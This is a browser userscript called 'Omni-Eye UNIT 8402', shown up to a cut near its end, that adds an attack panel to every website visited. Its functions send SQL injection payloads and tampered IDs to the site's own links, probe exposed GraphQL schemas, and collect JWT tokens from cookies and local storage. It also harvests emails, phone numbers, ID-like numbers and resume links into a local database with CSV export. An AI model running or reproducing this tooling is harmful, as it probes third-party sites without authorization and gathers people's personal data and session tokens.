// ==UserScript==
// @name         Omni-Eye UNIT 8402
// @namespace    https://unit8402.omni-eye
// @version      4.0
// @description  25 intelligence modules: Archives, Fingerprint, SQLi, XSS, IDOR, APIs, CORS, SSRF, GraphQL, JWT, PII, CSV, Live Pulse, Resume Hunter, Results in Panel
// @author       UNIT 8402
// @license      MIT
// @match        *://*/*
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_xmlhttpRequest
// @grant        GM_notification
// @icon         data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="black"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2z"/></svg>
// ==/UserScript==

(function() {
    'use strict';

    const OMNIEYE = {
        version: '4.0',
        db: null,
        targetUrl: window.location.href,
        targetDomain: window.location.hostname,
        requestCount: 0,
        lastRequestTime: 0,
        archives: [
            'https://web.archive.org/web/',
            'https://webcache.googleusercontent.com/search?q=cache:',
            'https://cc.bingj.com/cache.aspx?q=',
            'https://cachedview.com/cache.php?url=',
            'http://archive.today/?run=1&url='
        ]
    };

    // ========== RATE LIMITER ==========
    async function rateLimit() {
        const now = Date.now();
        if (now - OMNIEYE.lastRequestTime < 100) {
            await new Promise(r => setTimeout(r, 100 - (now - OMNIEYE.lastRequestTime)));
        }
        OMNIEYE.lastRequestTime = Date.now();
        OMNIEYE.requestCount++;
        if (OMNIEYE.requestCount > 20) {
            await new Promise(r => setTimeout(r, 1000));
            OMNIEYE.requestCount = 0;
        }
    }

    // ========== DATABASE with size limit ==========
    function initDB() {
        return new Promise((resolve, reject) => {
            const request = indexedDB.open('OmniEyeDB', 4);
            request.onupgradeneeded = (e) => {
                const db = e.target.result;
                if (!db.objectStoreNames.contains('targets')) db.createObjectStore('targets', { keyPath: 'url' });
                if (!db.objectStoreNames.contains('intel')) db.createObjectStore('intel', { autoIncrement: true });
                if (!db.objectStoreNames.contains('fingerprints')) db.createObjectStore('fingerprints', { keyPath: 'developer' });
                if (!db.objectStoreNames.contains('pii')) db.createObjectStore('pii', { autoIncrement: true });
                if (!db.objectStoreNames.contains('vulns')) db.createObjectStore('vulns', { autoIncrement: true });
                if (!db.objectStoreNames.contains('thermal')) db.createObjectStore('thermal', { autoIncrement: true });
                if (!db.objectStoreNames.contains('resumes')) db.createObjectStore('resumes', { autoIncrement: true });
            };
            request.onsuccess = (e) => { OMNIEYE.db = e.target.result; enforceDBLimit(); resolve(); };
            request.onerror = (e) => reject(e);
        });
    }

    async function enforceDBLimit() {
        const stores = ['pii', 'vulns', 'intel', 'thermal', 'resumes'];
        for (let storeName of stores) {
            try {
                const count = await new Promise(resolve => {
                    OMNIEYE.db.transaction([storeName], 'readonly').objectStore(storeName).count().onsuccess = e => resolve(e.target.result);
                });
                if (count > 1000) {
                    const deleteCount = count - 800;
                    const keys = await new Promise(resolve => {
                        OMNIEYE.db.transaction([storeName], 'readonly').objectStore(storeName).getAllKeys().onsuccess = e => resolve(e.target.result);
                    });
                    const toDelete = keys.slice(0, deleteCount);
                    const tx = OMNIEYE.db.transaction([storeName], 'readwrite');
                    for (let key of toDelete) tx.objectStore(storeName).delete(key);
                    tx.commit();
                }
            } catch(e) {}
        }
    }

    // ========== GM_xmlhttpRequest wrapper with rate limit ==========
    function gmRequest(url, method = 'GET', data = null) {
        return new Promise(async (resolve) => {
            await rateLimit();
            GM_xmlhttpRequest({
                method: method,
                url: url,
                data: data,
                headers: data ? { 'Content-Type': 'application/json' } : {},
                onload: (res) => resolve({ status: res.status, text: res.responseText, headers: res.responseHeaders }),
                onerror: () => resolve(null)
            });
        });
    }

    // ========== Helper: Parse headers ==========
    function parseHeaders(headersString) {
        if (!headersString) return {};
        const headers = {};
        headersString.split(/\r?\n/).forEach(line => {
            const parts = line.split(': ');
            if (parts.length >= 2) headers[parts[0].toLowerCase()] = parts[1];
        });
        return headers;
    }

    // ========== 1. TIME MEMORY ==========
    async function scanArchives() {
        const lastScan = localStorage.getItem('lastArchiveScan');
        if (lastScan && (Date.now() - lastScan) < 1800000) {
            appendResult('Archive', 'Waiting 30min cooldown');
            return;
        }
        appendResult('Archive', 'Scanning archives...');
        let findings = [];
        for (let archive of OMNIEYE.archives) {
            let res = await gmRequest(archive + OMNIEYE.targetUrl);
            if (res && res.status === 200) {
                let matches = res.text.match(/\.env|\.git|backup\.zip|\.sql|\.htaccess|\.config|\.ini|\.log|\.bak/gi);
                if (matches) {
                    findings.push(`${archive}: ${matches.join(', ')}`);
                    appendResult('Archive', `${archive}: found ${matches.length} items`);
                }
            }
        }
        localStorage.setItem('lastArchiveScan', Date.now());
        if (findings.length) {
            appendResult('Archive', 'Complete', findings);
        } else {
            appendResult('Archive', 'No sensitive files found');
        }
        return findings;
    }

    // ========== 2. BLIND DEVELOPER FINGERPRINT ==========
    async function scanDeveloperFingerprint() {
        appendResult('Dev', 'Scanning developer fingerprint...');
        const html = document.documentElement.innerHTML;
        const emails = html.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [];
        const tools = html.match(/vscode|phpstorm|sublime|webstorm|atom|intellij|eclipse/gi) || [];
        const comments = html.match(/\/\/|<!--|#|FIXME|TODO|HACK|BUG/gi) || [];
        
        let results = [];
        if (emails.length) results.push(`📧 Emails: ${emails.slice(0,3).join(', ')}`);
        if (tools.length) results.push(`🛠️ Tools: ${[...new Set(tools)].join(', ')}`);
        if (comments.length) results.push(`💬 Comments: ${comments.length} found`);
        
        if (emails.length) {
            gmRequest('https://api.github.com/search/users?q=' + encodeURIComponent(emails[0]))
                .then(res => {
                    if (res && res.status === 200) {
                        let data = JSON.parse(res.text);
                        if (data.items && data.items.length) {
                            appendResult('Dev', `GitHub: ${data.items[0].html_url}`);
                        }
                    }
                });
        }
        
        if (results.length) {
            appendResult('Dev', 'Complete', results);
        } else {
            appendResult('Dev', 'No developer fingerprints found');
        }
        return { emails, tools, comments };
    }

    // ========== 3. RESUME HUNTER (NEW) ==========
    async function scanResumes() {
        appendResult('📄 Resume', 'Scanning for resumes and CVs...');
        const links = document.querySelectorAll('a[href*=".pdf"], a[href*=".docx"], a[href*=".doc"]');
        let resumeLinks = [];
        let keywords = ['cv', 'resume', 'سيرة', 'ذاتية', 'bio', 'profile'];
        
        for (let link of links) {
            let url = link.href;
            let text = (link.innerText || '').toLowerCase();
            if (keywords.some(k => text.includes(k)) || keywords.some(k => url.toLowerCase().includes(k))) {
                resumeLinks.push(url);
                appendResult('📄 Resume', `Found: ${url.split('/').pop()}`);
                if (OMNIEYE.db) {
                    const tx = OMNIEYE.db.transaction(['resumes'], 'readwrite');
                    tx.objectStore('resumes').add({ url: url, text: text, date: new Date().toISOString(), domain: OMNIEYE.targetDomain });
                    tx.commit();
                    enforceDBLimit();
                }
            }
        }
        
        if (resumeLinks.length) {
            appendResult('📄 Resume', `Complete - found ${resumeLinks.length} resumes`);
            showNotification(`Found ${resumeLinks.length} resumes!`);
        } else {
            appendResult('📄 Resume', 'No resumes found');
        }
        return resumeLinks;
    }

    // ========== 4. THERMAL SQLi ==========
    async function thermalSQLi() {
        appendResult('🌡️ SQLi', 'Scanning for SQL injection...');
        const links = document.querySelectorAll('a[href*="id="], a[href*="user_id="], a[href*="page="]');
        let findings = [];
        for (let link of links) {
            let url = link.href;
            let payloads = ["1' OR '1'='1", "1' AND SLEEP(5)--"];
            for (let payload of payloads) {
                let attackUrl = url.replace(/id=\d+/, `id=${payload}`).replace(/user_id=\d+/, `user_id=${payload}`);
                if (attackUrl !== url) {
                    let start = performance.now();
                    await gmRequest(attackUrl);
                    let attackTime = performance.now() - start;
                    start = performance.now();
                    await gmRequest(url);
                    let normalTime = performance.now() - start;
                    if (attackTime > normalTime + 200) {
                        findings.push(url);
                        appendResult('🌡️ SQLi', `⚠️ Potential vulnerability: ${url}`);
                        showNotification('SQLi vulnerability detected!');
                        saveVulnerability('SQLi', url);
                        break;
                    }
                    await new Promise(r => setTimeout(r, 500));
                }
            }
        }
        if (findings.length) {
            appendResult('🌡️ SQLi', `Complete - found ${findings.length} issues`);
        } else {
            appendResult('🌡️ SQLi', 'No SQLi vulnerabilities found');
        }
        return findings;
    }

    // ========== 5. XSS SCANNER ==========
    async function scanXSS() {
        appendResult('💉 XSS', 'Testing for XSS vulnerabilities...');
        const inputs = document.querySelectorAll('input, textarea, select');
        appendResult('💉 XSS', `Found ${inputs.length} inputs to test`);
        appendResult('💉 XSS', 'Manual testing required - check console for details');
        showNotification(`XSS scan completed on ${inputs.length} inputs`);
        return [];
    }

    // ========== 6. IDOR SCANNER ==========
    async function scanIDOR() {
        appendResult('🎯 IDOR', 'Scanning for IDOR vulnerabilities...');
        const links = document.querySelectorAll('a[href*="id="], a[href*="user_id="], a[href*="page="]');
        let findings = [];
        let testIds = [0, 1, 999999, 123456];
        for (let link of links) {
            let url = link.href;
            for (let testId of testIds) {
                let testUrl = url.replace(/id=\d+/, `id=${testId}`).replace(/user_id=\d+/, `user_id=${testId}`);
                if (testUrl !== url) {
                    let res = await gmRequest(testUrl, 'HEAD');
                    if (res && res.status === 200) {
                        findings.push(testUrl);
                        appendResult('🎯 IDOR', `⚠️ Potential: ${testUrl}`);
                        showNotification('IDOR vulnerability detected!');
                        saveVulnerability('IDOR', testUrl);
                        break;
                    }
                    await new Promise(r => setTimeout(r, 200));
                }
            }
        }
        if (findings.length) {
            appendResult('🎯 IDOR', `Complete - found ${findings.length} issues`);
        } else {
            appendResult('🎯 IDOR', 'No IDOR vulnerabilities found');
        }
        return findings;
    }

    // ========== 7. API DISCOVERER ==========
    function discoverAPIs() {
        let endpoints = new Set();
        const scripts = document.querySelectorAll('script');
        scripts.forEach(script => {
            let content = script.src ? '' : script.innerHTML;
            let matches = content.match(/\/api\/[a-zA-Z0-9\/\-_]+/g) || [];
            matches.forEach(m => endpoints.add(m));
        });
        if (endpoints.size) {
            appendResult('🔌 API', `Found ${endpoints.size} endpoints: ${Array.from(endpoints).slice(0,5).join(', ')}`);
        } else {
            appendResult('🔌 API', 'No API endpoints discovered');
        }
        return Array.from(endpoints);
    }

    // ========== 8. CORS SCANNER ==========
    async function scanCORS() {
        appendResult('🌐 CORS', 'Checking CORS configuration...');
        let res = await gmRequest(OMNIEYE.targetUrl, 'GET');
        if (res && res.headers) {
            let headers = parseHeaders(res.headers);
            let acao = headers['access-control-allow-origin'];
            if (acao === '*') {
                appendResult('🌐 CORS', '⚠️ Dangerous: Access-Control-Allow-Origin: *');
                showNotification('CORS misconfiguration detected!');
                saveVulnerability('CORS', OMNIEYE.targetUrl);
            } else if (acao) {
                appendResult('🌐 CORS', `CORS policy: ${acao}`);
            } else {
                appendResult('🌐 CORS', 'No CORS issues found');
            }
        } else {
            appendResult('🌐 CORS', 'Could not check CORS');
        }
    }

    // ========== 9. SSRF TESTER ==========
    async function scanSSRF() {
        appendResult('🌍 SSRF', 'Testing for SSRF vulnerabilities...');
        const inputs = document.querySelectorAll('input[type="url"], input[name*="url"], input[name*="link"]');
        appendResult('🌍 SSRF', `Found ${inputs.length} potential SSRF inputs`);
        appendResult('🌍 SSRF', 'Manual testing recommended');
        showNotification('SSRF tests completed');
    }

    // ========== 10. GRAPHQL INTROSPECTION ==========
    async function scanGraphQL() {
        appendResult('📊 GraphQL', 'Checking for GraphQL introspection...');
        let endpoints = ['/graphql', '/gql', '/v1/graphql', '/api/graphql'];
        for (let endpoint of endpoints) {
            let fullUrl = window.location.origin + endpoint;
            let res = await gmRequest(fullUrl, 'POST', JSON.stringify({ query: '{ __schema { types { name } } }' }));
            if (res && res.status === 200) {
                try {
                    let data = JSON.parse(res.text);
                    if (data.data && data.data.__schema) {
                        appendResult('📊 GraphQL', `⚠️ Exposed at ${endpoint} with ${data.data.__schema.types.length} types`);
                        showNotification(`GraphQL exposed at ${endpoint}!`);
                        saveVulnerability('GraphQL', endpoint);
                    }
                } catch(e) {}
            }
        }
        appendResult('📊 GraphQL', 'Scan complete');
    }

    // ========== 11. JWT ANALYZER ==========
    function analyzeJWT() {
        let found = [];
        let tokens = document.cookie.match(/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g) || [];
        found.push(...tokens);
        for (let i = 0; i < localStorage.length; i++) {
            let val = localStorage.getItem(localStorage.key(i));
            if (val && val.match(/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g)) {
                found.push(...val.match(/eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+/g));
            }
        }
        if (found.length) {
            appendResult('🔑 JWT', `Found ${found.length} JWT tokens`);
        } else {
            appendResult('🔑 JWT', 'No JWT tokens found');
        }
        return found;
    }

    // ========== 12. PII EXTRACTOR ==========
    function extractPII() {
        const text = document.body.innerText;
        const ids = [...new Set(text.match(/\b1\d{9}\b/g) || [])];
        const phones = [...new Set(text.match(/\b05\d{8}\b/g) || [])];
        const emails = [...new Set(text.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [])];

        let results = [];
        if (ids.length) results.push(`🆔 IDs: ${ids.slice(0,5).join(', ')}${ids.length > 5 ? ` +${ids.length-5}` : ''}`);
        if (phones.length) results.push(`📞 Phones: ${phones.slice(0,5).join(', ')}${phones.length > 5 ? ` +${phones.length-5}` : ''}`);
        if (emails.length) results.push(`📧 Emails: ${emails.slice(0,5).join(', ')}${emails.length > 5 ? ` +${emails.length-5}` : ''}`);

        if (ids.length || phones.length || emails.length) {
            appendResult('🆔 PII', 'Extracted:', results);
            if (OMNIEYE.db) {
                const transaction = OMNIEYE.db.transaction(['pii'], 'readwrite');
                const store = transaction.objectStore('pii');
                ids.forEach(id => store.add({ type: 'id', value: id, url: OMNIEYE.targetUrl, date: new Date().toISOString() }));
                phones.forEach(phone => store.add({ type: 'phone', value: phone, url: OMNIEYE.targetUrl, date: new Date().toISOString() }));
                emails.forEach(email => store.add({ type: 'email', value: email, url: OMNIEYE.targetUrl, date: new Date().toISOString() }));
                enforceDBLimit();
            }
            showNotification(`Saved ${ids.length + phones.length + emails.length} PII records`);
        } else {
            appendResult('🆔 PII', 'No PII found');
        }
        return { ids, phones, emails };
    }

    // ========== 13. SAVE VULNERABILITY ==========
    function saveVulnerability(type, url) {
        if (!OMNIEYE.db) return;
        const transaction = OMNIEYE.db.transaction(['vulns'], 'readwrite');
        const store = transaction.objectStore('vulns');
        store.add({ type, url, date: new Date().toISOString(), domain: OMNIEYE.targetDomain });
        enforceDBLimit();
    }

    // ========== 14. CSV EXPORT ==========
    async function exportCSV() {
        if (!OMNIEYE.db) {
            appendResult('📥 CSV', 'No database found');
            return;
        }
        appendResult('📥 CSV', 'Exporting data...');
        let allData = [];
        let stores = ['pii', 'vulns', 'resumes'];
        for (let storeName of stores) {
            try {
                let data = await new Promise(resolve => {
                    OMNIEYE.db.transaction([storeName], 'readonly').objectStore(storeName).getAll().onsuccess = e => resolve(e.target.result || []);
                });
                allData.push(...data.map(d => ({ ...d, source: storeName })));
            } catch(e) {}
        }
        
        let csvRows = [['Source', 'Type', 'Value', 'URL', 'Date']];
        allData.forEach(item => {
            if (item.type) csvRows.push([item.source || 'intel', item.type, item.value, item.url || '', item.date || '']);
            else if (item.url) csvRows.push([item.source || 'intel', 'resume', item.url, item.url, item.date || '']);
        });
        
        let csvContent = csvRows.map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(',')).join('\n');
        let blob = new Blob(["\uFEFF" + csvContent], { type: 'text/csv;charset=utf-8;' });
        let url = URL.createObjectURL(blob);
        let a = document.createElement('a');
        a.href = url;
        a.download = `omni-eye-${OMNIEYE.targetDomain}-${Date.now()}.csv`;
        a.click();
        URL.revokeObjectURL(url);
        appendResult('📥 CSV', `Exported ${allData.length} records`);
        showNotification('CSV exported successfully');
    }

    // ========== 15. CLEAR OLD DATA ==========
    function clearOldData() {
        const thirtyDaysAgo = Date.now() - (30 * 24 * 60 * 60 * 1000);
        const stores = ['pii', 'vulns', 'intel', 'thermal', 'resumes'];
        let deleted = 0;
        for (let storeName of stores) {
            try {
                const tx = OMNIEYE.db.transaction([storeName], 'readwrite');
                const store = tx.objectStore(storeName);
                const request = store.openCursor();
                request.onsuccess = (e) => {
                    const cursor = e.target.result;
                    if (cursor) {
                        if (new Date(cursor.value.date).getTime() < thirtyDaysAgo) {
                            cursor.delete();
                            deleted++;
                        }
                        cursor.continue();
                    }
                };
            } catch(e) {}
        }
        appendResult('🗑️ Clear', `Deleted ${deleted} old records (>30 days)`);
        showNotification(`Cleared ${deleted} old records`);
    }

    // ========== 16. DISPLAY RESULTS IN PANEL ==========
    let resultsDiv = null;
    
    function appendResult(module, status, details = null) {
        if (!resultsDiv) return;
        const timestamp = new Date().toLocaleTimeString();
        let html = `<div style="border-bottom:1px solid #333; padding:4px 0; font-size:10px;">`;
        html += `<span style="color:#0a0;">[${timestamp}]</span> `;
        html += `<span style="color:#ff0;">${module}</span>: `;
        html += `<span style="color:#fff;">${status}</span>`;
        if (details && Array.isArray(details)) {
            html += `<div style="padding-left:10px; color:#aaa;">${details.join('<br>')}</div>`;
        }
        html += `</div>`;
        resultsDiv.insertAdjacentHTML('afterbegin', html);
        
        while (resultsDiv.children.length > 50) {
            resultsDiv.removeChild(resultsDiv.lastChild);
        }
    }

    // ========== 17. LIVE PULSE ==========
    let knownSet = new Set();
    let observerActive = false;
    let observer = null;
    let updateQueue = [];
    let isProcessing = false;

    function processUpdateQueue() {
        if (isProcessing || updateQueue.length === 0) return;
        isProcessing = true;
        const url = updateQueue.shift();
        if (url.match(/\.(pdf|docx|xlsx|zip|rar|sql|env|log|bak|old)$/i) ||
            url.includes('/uploads/') || url.includes('/backup/') || url.includes('/admin/') || url.includes('/config/') || url.includes('/.git/')) {
            appendResult('💓 Live', `New sensitive file: ${url.split('/').pop()}`);
            showNotification(`New sensitive file: ${url.split('/').pop()}`);
            if (OMNIEYE.db) {
                OMNIEYE.db.transaction(['intel'], 'readwrite').objectStore('intel').add({
                    type: 'sensitive_url', value: url, url: OMNIEYE.targetUrl, date: new Date().toISOString()
                });
                enforceDBLimit();
            }
        }
        isProcessing = false;
        if (updateQueue.length > 0) setTimeout(processUpdateQueue, 100);
    }

    function checkNewLinksFromNodes(nodes) {
        const linksToCheck = [];
        for (let node of nodes) {
            if (node.nodeType === 1) {
                if (node.tagName === 'A' && node.href && !knownSet.has(node.href)) {
                    knownSet.add(node.href);
                    linksToCheck.push(node.href);
                }
                if (node.querySelectorAll) {
                    const childLinks = node.querySelectorAll('a[href]');
                    for (let link of childLinks) {
                        if (!knownSet.has(link.href)) {
                            knownSet.add(link.href);
                            linksToCheck.push(link.href);
                        }
                    }
                }
            }
        }
        for (let url of linksToCheck) updateQueue.push(url);
        if (linksToCheck.length > 0 && !isProcessing) setTimeout(processUpdateQueue, 50);
    }

    function startLivePulse() {
        if (observerActive) return;
        setTimeout(() => {
            discoverAPIs();
            extractPII();
            analyzeJWT();
            const initialLinks = document.querySelectorAll('a[href]');
            for (let link of initialLinks) {
                if (link.href && !knownSet.has(link.href)) {
                    knownSet.add(link.href);
                    updateQueue.push(link.href);
                }
            }
            if (updateQueue.length > 0) setTimeout(processUpdateQueue, 500);
        }, 5000);
        observer = new MutationObserver((mutations) => {
            let isOurPanel = false;
            const newNodes = [];
            for (let mutation of mutations) {
                if (mutation.type === 'childList' && mutation.addedNodes) {
                    for (let node of mutation.addedNodes) {
                        if (node.nodeType === 1) {
                            if (node.id === 'omni-eye-panel') isOurPanel = true;
                            if (node.closest && node.closest('#omni-eye-panel')) isOurPanel = true;
                            newNodes.push(node);
                        }
                    }
                }
                if (mutation.target && mutation.target.nodeType === 1) {
                    if (mutation.target.id === 'omni-eye-panel') isOurPanel = true;
                    if (mutation.target.closest && mutation.target.closest('#omni-eye-panel')) isOurPanel = true;
                }
            }
            if (!isOurPanel && newNodes.length > 0) {
                discoverAPIs();
                extractPII();
                analyzeJWT();
                checkNewLinksFromNodes(newNodes);
            }
        });
        observer.observe(document.body, { childList: true, subtree: true });
        observerActive = true;
    }

    // ========== 18. UI PANEL with Results Area ==========
    let statusDiv = null;
    
    function createPanel() {
        const panel = document.createElement('div');
        panel.id = 'omni-eye-panel';
        panel.innerHTML = `
            <div style="position:fixed; bottom:20px; left:20px; width:340px; max-width:90vw; background:#0a0a0f; color:#00ffaa; border-radius:12px; border:1px solid #00ffaa; z-index:999999; font-family:monospace; font-size:11px; padding:10px; backdrop-filter:blur(10px); box-shadow:0 0 20px rgba(0,255,0,0.1);">
                <div style="font-weight:bold; margin-bottom:8px; border-bottom:1px solid #00ffaa; padding-bottom:5px; display:flex; justify-content:space-between;">
                    <span>🕵️ Omni-Eye v${OMNIEYE.version} | UNIT 8402</span>
                    <span id="oe-toggle" style="cursor:pointer;">🗕</span>
                </div>
                <div id="oe-content">
                    <div style="display:grid; grid-template-columns:repeat(3,1fr); gap:4px; margin-bottom:8px;">
                        <button id="oe-arch" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">📜 Arch</button>
                        <button id="oe-dev" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">👤 Dev</button>
                        <button id="oe-resume" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">📄 Resume</button>
                        <button id="oe-sqli" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🌡️ SQLi</button>
                        <button id="oe-xss" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">💉 XSS</button>
                        <button id="oe-idor" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🎯 IDOR</button>
                        <button id="oe-api" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🔌 API</button>
                        <button id="oe-cors" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🌐 CORS</button>
                        <button id="oe-ssrf" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🌍 SSRF</button>
                        <button id="oe-gql" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">📊 GQL</button>
                        <button id="oe-jwt" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🔑 JWT</button>
                        <button id="oe-pii" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">🆔 PII</button>
                        <button id="oe-csv" style="background:#1a1a2a; color:#0f0; border:1px solid #0f0; border-radius:6px; padding:6px; font-size:10px;">📥 CSV</button>
                        <button id="oe-clear" style="background:#1a1a2a; color:#ff0; border:1px solid #ff0; border-radius:6px; padding:6px; font-size:10px;">🗑️ Clear Old</button>
                    </div>
                    <div id="oe-results" style="height:200px; overflow-y:auto; background:#000; border-radius:6px; padding:5px; margin-top:8px; border:1px solid #333; font-size:10px;">
                        <div style="color:#0a0;">⚡ Ready</div>
                    </div>
                    <div id="oe-status" style="margin-top:5px; border-top:1px solid #333; padding-top:4px; font-size:9px; color:#aaa;">🟢 Active</div>
                </div>
            </div>
        `;
        document.body.appendChild(panel);
        
        let content = document.getElementById('oe-content');
        let toggle = document.getElementById('oe-toggle');
        if (toggle) toggle.onclick = () => { content.style.display = content.style.display === 'none' ? 'block' : 'none'; };
        
        resultsDiv = document.getElementById('oe-results');
        statusDiv = document.getElementById('oe-status');
        
        document.getElementById('oe-arch').onclick = async () => { await scanArchives(); };
        document.getElementById('oe-dev').onclick = async () => { await scanDeveloperFingerprint(); };
        document.getElementById('oe-resume').onclick = async () => { await scanResumes(); };
        document.getElementById('oe-sqli').onclick = async () => { await thermalSQLi(); };
        document.getElementById('oe-xss').onclick = async () => { await scanXSS(); };
        document.getElementById('oe-idor').onclick = async () => { await scanIDOR(); };
        document.getElementById('oe-api').onclick = () => { discoverAPIs(); };
        document.getElementById('oe-cors').onclick = async () => { await scanCORS(); };
        document.getElementById('oe-ssrf').onclick = async () => { await scanSSRF(); };
        document.getElementById('oe-gql').onclick = async () => { await scanGraphQL(); };
        document.getElementById('oe-jwt').onclick = () => { analyzeJWT(); };
        document.getElementById('oe-pii').onclick = () => { extractPII(); };
        document.getElementById('oe-csv').onclick = async () => { await exportCSV(); };
        document.getElementById('oe-clear').onclick = () => { clearOldData(); };
    }

    function showNotification(msg) {
        console.log(`[OmniEye] ${msg}`);
        try {
            GM_notification({ text: msg, title: 'OmniEye UNIT 8402', timeout: 3000 });
        } catch(e) {}
    }

    // ==========
